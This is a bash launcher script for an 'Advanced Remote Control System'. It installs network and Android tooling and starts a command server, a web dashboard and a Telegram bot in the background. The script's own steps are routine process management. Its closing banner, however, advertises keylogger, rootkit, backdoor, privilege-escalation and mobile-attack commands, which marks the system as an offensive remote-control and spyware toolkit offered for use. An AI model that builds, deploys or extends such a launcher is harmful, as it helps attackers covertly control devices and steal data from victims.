#!/bin/bash

# ========================================
# Advanced Remote Control System
# Complete Auto Startup Script
# ========================================

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_header() {
    echo -e "${BLUE}================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}================================${NC}"
}

print_success() {
    echo -e "${GREEN}✅ $1${NC}"
}

print_fail() {
    echo -e "${RED}❌ $1${NC}"
}

# Function to check system requirements
check_requirements() {
    print_header "Checking System Requirements"
    
    # Check Python
    if command -v python3 &> /dev/null; then
        print_success "Python3: $(python3 --version)"
    else
        print_fail "Python3 not found"
        exit 1
    fi
    
    # Check Node.js
    if command -v node &> /dev/null; then
        print_success "Node.js: $(node --version)"
    else
        print_fail "Node.js not found"
        exit 1
    fi
    
    # Check npm
    if command -v npm &> /dev/null; then
        print_success "npm: $(npm --version)"
    else
        print_fail "npm not found"
        exit 1
    fi
    
    # Check pyenv
    if command -v pyenv &> /dev/null; then
        print_success "pyenv: $(pyenv --version)"
    else
        print_warning "pyenv not found - TensorFlow may not work"
    fi
    
    print_success "All basic requirements met"
}

# Function to install all dependencies
install_dependencies() {
    print_header "Installing Dependencies"
    
    # Install Python system dependencies
    print_status "Installing Python system dependencies..."
    pip3 install --break-system-packages websockets flask psutil python-nmap scapy paramiko cryptography adb-shell numpy pandas scikit-learn matplotlib seaborn asyncio schedule pyTelegramBotAPI requests
    
    # Install bot dependencies
    if [ -f "remote-control-system/telegram-bot/requirements.txt" ]; then
        print_status "Installing bot dependencies..."
        cd remote-control-system/telegram-bot
        pip3 install --break-system-packages -r requirements.txt
        cd ../..
    fi
    
    # Install command server dependencies
    if [ -f "remote-control-system/command-server/requirements.txt" ]; then
        print_status "Installing command server dependencies..."
        cd remote-control-system/command-server
        pip3 install --break-system-packages -r requirements.txt
        cd ../..
    fi
    
    # Install TensorFlow if pyenv is available
    if command -v pyenv &> /dev/null; then
        print_status "Installing TensorFlow in pyenv environment..."
        pyenv exec pip install tensorflow
        print_success "TensorFlow installed successfully"
    else
        print_warning "TensorFlow installation skipped (pyenv not available)"
    fi
    
    # Install Node.js dependencies
    if [ -f "remote-control-system/web-interface/package.json" ]; then
        print_status "Installing web interface dependencies..."
        cd remote-control-system/web-interface
        npm install
        cd ../..
    fi
    
    print_success "All dependencies installed"
}

# Function to create necessary directories
create_directories() {
    print_status "Creating necessary directories..."
    
    mkdir -p logs
    mkdir -p data
    mkdir -p remote-control-system/external_tools
    mkdir -p remote-control-system/database
    mkdir -p remote-control-system/logs
    
    print_success "Directories created"
}

# Function to start command server
start_command_server() {
    print_status "Starting command server..."
    
    cd remote-control-system/command-server
    
    # Use pyenv if available, otherwise use system Python
    if command -v pyenv &> /dev/null; then
        pyenv exec python3 server.py > ../../logs/command-server.log 2>&1 &
    else
        python3 server.py > ../../logs/command-server.log 2>&1 &
    fi
    
    COMMAND_SERVER_PID=$!
    echo $COMMAND_SERVER_PID > ../../.command-server.pid
    cd ../..
    
    print_success "Command server started (PID: $COMMAND_SERVER_PID)"
    sleep 3
}

# Function to start web interface
start_web_interface() {
    print_status "Starting web interface..."
    
    # Check if web dashboard exists in root
    if [ -f "web_dashboard.py" ]; then
        python3 web_dashboard.py > logs/web-interface.log 2>&1 &
        WEB_INTERFACE_PID=$!
        echo $WEB_INTERFACE_PID > .web-interface.pid
        print_success "Web interface started (PID: $WEB_INTERFACE_PID)"
    else
        # Check in web-interface directory
        cd remote-control-system/web-interface
        
        if [ -f "server.js" ]; then
            node server.js > ../../logs/web-interface.log 2>&1 &
        elif [ -f "web_dashboard.py" ]; then
            python3 web_dashboard.py > ../../logs/web-interface.log 2>&1 &
        else
            print_error "Web interface not found"
            return 1
        fi
        
        WEB_INTERFACE_PID=$!
        echo $WEB_INTERFACE_PID > ../../.web-interface.pid
        cd ../..
        print_success "Web interface started (PID: $WEB_INTERFACE_PID)"
    fi
    
    sleep 2
}

# Function to start telegram bot
start_telegram_bot() {
    print_status "Starting telegram bot..."
    
    cd remote-control-system/telegram-bot
    
    # Use pyenv if available, otherwise use system Python
    if command -v pyenv &> /dev/null; then
        pyenv exec python3 bot.py > ../../logs/telegram-bot.log 2>&1 &
    else
        python3 bot.py > ../../logs/telegram-bot.log 2>&1 &
    fi
    
    TELEGRAM_BOT_PID=$!
    echo $TELEGRAM_BOT_PID > ../../.telegram-bot.pid
    cd ../..
    
    print_success "Telegram bot started (PID: $TELEGRAM_BOT_PID)"
}

# Function to check system status
check_system_status() {
    print_header "System Status"
    
    # Check command server
    if [ -f ".command-server.pid" ] && kill -0 $(cat .command-server.pid) 2>/dev/null; then
        print_success "Command server: Running (PID: $(cat .command-server.pid))"
    else
        print_fail "Command server: Not running"
    fi
    
    # Check web interface
    if [ -f ".web-interface.pid" ] && kill -0 $(cat .web-interface.pid) 2>/dev/null; then
        print_success "Web interface: Running (PID: $(cat .web-interface.pid))"
    else
        print_fail "Web interface: Not running"
    fi
    
    # Check telegram bot
    if [ -f ".telegram-bot.pid" ] && kill -0 $(cat .telegram-bot.pid) 2>/dev/null; then
        print_success "Telegram bot: Running (PID: $(cat .telegram-bot.pid))"
    else
        print_fail "Telegram bot: Not running"
    fi
    
    echo ""
    print_status "System URLs:"
    echo "  🔧 Command Server: http://localhost:10001"
    echo "  🌐 Web Dashboard: http://localhost:8081"
    echo "  🤖 Telegram Bot: Running in background"
}

# Function to stop the system
stop_system() {
    print_header "Stopping System"
    
    # Stop command server
    if [ -f ".command-server.pid" ]; then
        kill $(cat .command-server.pid) 2>/dev/null || true
        rm -f .command-server.pid
        print_status "Command server stopped"
    fi
    
    # Stop web interface
    if [ -f ".web-interface.pid" ]; then
        kill $(cat .web-interface.pid) 2>/dev/null || true
        rm -f .web-interface.pid
        print_status "Web interface stopped"
    fi
    
    # Stop telegram bot
    if [ -f ".telegram-bot.pid" ]; then
        kill $(cat .telegram-bot.pid) 2>/dev/null || true
        rm -f .telegram-bot.pid
        print_status "Telegram bot stopped"
    fi
    
    # Kill any remaining processes
    pkill -f "server.py" 2>/dev/null || true
    pkill -f "web_dashboard.py" 2>/dev/null || true
    pkill -f "bot.py" 2>/dev/null || true
    
    print_success "System stopped successfully"
}

# Function to restart the system
restart_system() {
    print_header "Restarting System"
    stop_system
    sleep 2
    start_system
}

# Function to start the complete system
start_system() {
    print_header "🚀 Starting Advanced Remote Control System"
    
    # Check requirements
    check_requirements
    
    # Create directories
    create_directories
    
    # Install dependencies
    install_dependencies
    
    # Start components
    print_header "Starting System Components"
    start_command_server
    start_web_interface
    start_telegram_bot
    
    # Show status
    check_system_status
    
    print_header "🎉 System Started Successfully!"
    echo "🎯 All components are running"
    echo "📊 Check logs in the 'logs' directory"
    echo "🛑 Use '$0 stop' to stop the system"
    echo ""
    echo "📋 Available Commands:"
    echo "  🔑 /keylogger start|stop|data"
    echo "  🔧 /rootkit install|escalate|hide"
    echo "  🚪 /backdoor create|execute|transfer"
    echo "  💻 /system info|control|monitor"
    echo "  📱 /mobile attack|control|extract"
    echo "  🌐 /network scan|attack|monitor"
    echo ""
    echo "🔗 Access URLs:"
    echo "  🌐 Web Dashboard: http://localhost:8081"
    echo "  🔧 Command Server: http://localhost:10001"
    echo "  🤖 Telegram Bot: Check logs for connection status"
}

# Function to show help
show_help() {
    print_header "Advanced Remote Control System - Help"
    
    echo "Usage: $0 [OPTION]"
    echo ""
    echo "Options:"
    echo "  start     - Start the complete system"
    echo "  stop      - Stop the system"
    echo "  restart   - Restart the system"
    echo "  status    - Show system status"
    echo "  check     - Check system requirements"
    echo "  help      - Show this help message"
    echo ""
    echo "Examples:"
    echo "  $0 start"
    echo "  $0 status"
    echo "  $0 check"
    echo ""
    echo "System Components:"
    echo "  🔧 Command Server: http://localhost:10001"
    echo "  🌐 Web Dashboard: http://localhost:8081"
    echo "  🤖 Telegram Bot: Running in background"
}

# Main script logic
case "${1:-help}" in
    "start")
        start_system
        ;;
    "stop")
        stop_system
        ;;
    "restart")
        restart_system
        ;;
    "status")
        check_system_status
        ;;
    "check")
        check_requirements
        ;;
    "help"|*)
        show_help
        ;;
esac